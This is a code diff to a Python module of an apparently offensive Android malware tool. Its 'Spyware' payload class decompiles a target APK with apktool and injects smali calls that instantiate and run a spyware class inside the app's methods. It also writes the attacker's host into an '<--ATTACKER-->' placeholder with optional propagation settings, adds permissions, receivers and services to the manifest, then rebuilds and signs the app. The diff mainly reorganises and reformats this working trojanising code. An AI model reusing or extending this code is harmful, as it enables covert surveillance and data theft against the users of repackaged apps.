@@ -14,7 +14,6 @@
 
 import os
 import logging
-import shutil
 import subprocess
 import sys
 import time
@@ -22,8 +21,8 @@ import zipfile
 
 from metadata import metadata
 from payloads.payload import Payload
-from reverse_engineer import reverse_engineer
 from utils import config, register_operation
+
 
 class Spyware(Payload):
     def __init__(self, args):
@@ -32,30 +31,7 @@ class Spyware(Payload):
         self.propagate = self.args.propagate
 
     def run(self):
-        logging.info("disassembling...")
-        logging.warning("this operation might take some time")
-        reverse_engineer.disassemble(self)
-
-        logging.info("export the smali payload files into the app...")
-        payload_path = self.export_payload()
-        logging.info("populate the payload rhost and propagate values")
-        self.set_payload_settings(payload_path)
-
-        logger.info("injecting...")
-        if (os.path.isdir(self.destination)):
-            dir_metadata = metadata.generate_dir_metadata(self.destination)
-            self.inject_in_dir(dir_metadata)
-
-        elif (os.path.isfile(self.destination)):
-            file_metadata = metadata.generate_file_metadata(self.destination)
-            self.inject(self.destination, file_metadata)
-
-        logging.info("reassembling...")
-        logging.warning("this operation might take some time")
-        reverse_engineer.reassemble(self)
-
-        logging.info("signing...")
-        reverse_engineer.sign(self)
+        super(Spyware, self).run()
 
     def inject(self, file_path, file_metadata):
         """
@@ -78,22 +54,28 @@ class Spyware(Payload):
                     words = line.split()
                     # Retrieving the method information from the meta-data
                     data = metadata.get_data(words[-1], file_metadata)
-                    valid_regs = register_operation.get_valid_regs(data[3], data[2])
+                    valid_regs = register_operation.get_valid_regs(
+                        data[3], data[2])
                     # The method must have at least one free register, less
                     # than sixteen register, must not
                     # contain any monitor directive and not be alredy edited
                     if ((len(valid_regs) > 1) and (len(data[2]) < 16) and not
-                       (data[4]) and not (self.name in data[5])):
+                       (data[4]) and not (self.payload_name in data[5])):
                         process = True
 
                     buffer.append(line)
 
                 elif ((line.find("return", 0, 20) > 0) and (process)):
                     # We mark the method as processed
-                    buffer.append("\t# {0} has been injected on {1}\n".format(
-                        self.name, time.strftime(
-                            "%Y-%m-%d %H:%M:%S", time.gmtime())))
-                    data[5].append(self.name)
+                    buffer.append(
+                        "\t# {0} has been injected on {1}\n".format(
+                            self.payload_name, time.strftime(
+                                "%Y-%m-%d %H:%M:%S",
+                                time.gmtime()
+                            )
+                        )
+                    )
+                    data[5].append(self.payload_name)
 
                     # We initialize our spyware class with an application
                     # context
@@ -113,19 +95,22 @@ class Spyware(Payload):
                         "\tinvoke-direct {{{0}, {1}}}, "
                         "Landroid/spyware/Spyware;-><init>"
                         "(Landroid/content/Context;)V\n".format(
-                            valid_regs[0], valid_regs[1])
+                            valid_regs[0], valid_regs[1]
+                        )
                     )
 
                     # We instantiate a spyware and hijack the app
                     buffer.append(
                         '\t.local {0}, '
                         '"launcher":Landroid/spyware/Spyware;\n'.format(
-                            valid_regs[0])
+                            valid_regs[0]
+                        )
                     )
                     buffer.append(
                         "\tinvoke-virtual {{{0}}}, "
                         "Landroid/spyware/Spyware;->run()V\n".format(
-                            valid_regs[0])
+                            valid_regs[0]
+                        )
                     )
                     buffer.append(line)
 
@@ -145,67 +130,16 @@ class Spyware(Payload):
             for line in buffer:
                 file.write(line)
 
-    # TODO: break this funtion in 3 parts - get AM, change AM, compile AM
-    def get_updated_AndroidManifest(self):
-        """
-        Disassemble an app using apktool to extract, edit and recompile
-        the AndroidManifest.
-        """
-        try:
-            logging.info("disassemble the app ressources")
-            instruction = (
-                "java -jar ../libs/apktool_2.2.4.jar decode --force "
-                "--no-src {} -o {}".format(
-                    self.app_path,
-                    os.path.join(config.TMP_FOLDER, self.app_name + "_res"))
-            )
-            logging.debug("{}".format(instruction))
-            subprocess.check_output(instruction, shell=True)
-
-            logging.info("add permissions, receivers and services to the 'AndroidManifest.xml'")
-            self.add_AndroidManifest_permissions(
-                os.path.join(
-                    config.TMP_FOLDER, self.app_name + "_res",
-                    "AndroidManifest.xml"))
-
-            logging.info("disassemble the app")
-            instruction = (
-                "java -jar ../libs/apktool_2.2.4.jar build --force "
-                "{} -o {}".format(
-                    os.path.join(
-                        config.TMP_FOLDER, self.app_name + "_res"),
-                    os.path.join(
-                        config.TMP_FOLDER, self.app_name + "-apktool.apk"))
-            )
-            logging.debug("{}".format(instruction))
-            subprocess.check_output(instruction, shell=True)
-
-            logging.info("extract the newly assembled 'AndroidManifest.xml'")
-            with zipfile.ZipFile(os.path.join(
-                 config.TMP_FOLDER, self.app_name + "-apktool.apk"),
-                 'r') as zip_file:
-                zip_file.extract(
-                    "AndroidManifest.xml",
-                    os.path.join(config.TMP_FOLDER))
-
-            # Remove the "_res" folder and the apktool built app
-            logging.info("remove the apktool disassembled folder and reassembled app from the 'tmp' folder")
-            shutil.rmtree(os.path.join(
-                config.TMP_FOLDER, self.app_name + "_res"), ignore_errors=True)
-            os.remove(os.path.join(
-                config.TMP_FOLDER, self.app_name + "-apktool.apk"))
-
-            # Return the path of the updated AndroidManifest
-            return os.path.join(config.TMP_FOLDER, "AndroidManifest.xml")
-
-        except subprocess.CalledProcessError as ex:
-            logging.critical("{} - {}".format(ex.returncode, ex.output.decode()))
-            sys.exit(1)
-
     def set_payload_settings(self, payload_path):
         """
         Add the rhost and ppg to the AndroidManifest.
         """
+        logging.info(
+            "configuring the {} parameters...".format(
+                self.payload_name
+            )
+        )
+
         files = os.listdir(payload_path)
 
         for file in files:
@@ -218,11 +152,13 @@ class Spyware(Payload):
                         buffer.append(
                             line.replace("<--ATTACKER-->", self.rhost)
                         )
+
                     elif (line.find("<--PROPAGATE-->") >= 0):
                         if self.propagate:
                             buffer.append(
                                 line.replace("<--PROPAGATE-->", self.propagate)
                             )
+
                     else:
                         buffer.append(line)
 
@@ -231,7 +167,80 @@ class Spyware(Payload):
                 for line in buffer:
                     file.write(line)
 
-    # Pass a list of arguments to add
+    # TODO: break this funtion in 3 parts - get AM, change AM, compile AM
+    def get_updated_AndroidManifest(self):
+        """
+        Disassemble an app using apktool to extract, edit and recompile
+        the AndroidManifest.
+        """
+        try:
+            logging.info("disassembling the app ressources")
+            instruction = (
+                "java -jar ../libs/apktool_2.2.4.jar decode --force "
+                "--no-src {} -o {}".format(
+                    self.app_path,
+                    os.path.join(
+                        config.TMP_FOLDER,
+                        os.path.splitext(self.app_name)[0] + "_res"
+                    )
+                )
+            )
+            logging.debug("executing command: {}".format(instruction))
+            subprocess.check_output(instruction, shell=True)
+
+            logging.info(
+                "adding permissions, broadcast receivers and services in the "
+                "'AndroidManifest.xml'..."
+            )
+            self.add_AndroidManifest_permissions(
+                os.path.join(
+                    config.TMP_FOLDER,
+                    os.path.splitext(self.app_name)[0] + "_res",
+                    "AndroidManifest.xml"
+                )
+            )
+
+            logging.info("building the malware 'AndroidManifest.xml'...")
+            instruction = (
+                "java -jar ../libs/apktool_2.2.4.jar build --force "
+                "{} -o {}".format(
+                    os.path.join(
+                        config.TMP_FOLDER,
+                        os.path.splitext(self.app_name)[0] + "_res"
+                    ),
+                    os.path.join(
+                        config.TMP_FOLDER,
+                        os.path.splitext(self.app_name)[0] + "_apktool.apk"
+                    )
+                )
+            )
+            logging.debug("executing command: {}".format(instruction))
+            subprocess.check_output(instruction, shell=True)
+
+            logging.info(
+                "extracting the built 'AndroidManifest.xml' to {}...".format(
+                    config.TMP_FOLDER
+                )
+            )
+            with zipfile.ZipFile(os.path.join(
+                 config.TMP_FOLDER,
+                 os.path.splitext(self.app_name)[0] + "_apktool.apk"),
+                 'r') as zip_file:
+                zip_file.extract(
+                    "AndroidManifest.xml",
+                    os.path.join(config.TMP_FOLDER)
+                )
+
+            # Return the path of the updated AndroidManifest
+            return os.path.join(config.TMP_FOLDER, "AndroidManifest.xml")
+
+        except subprocess.CalledProcessError as ex:
+            logging.critical(
+                "{} - {}".format(ex.returncode, ex.output.decode())
+            )
+            sys.exit(1)
+
+    # TODO: Improvement - pass a list of arguments to add
     def add_AndroidManifest_permissions(self, file_path):
         """
         Add the minimum required permissions, services and broadcastReceivers
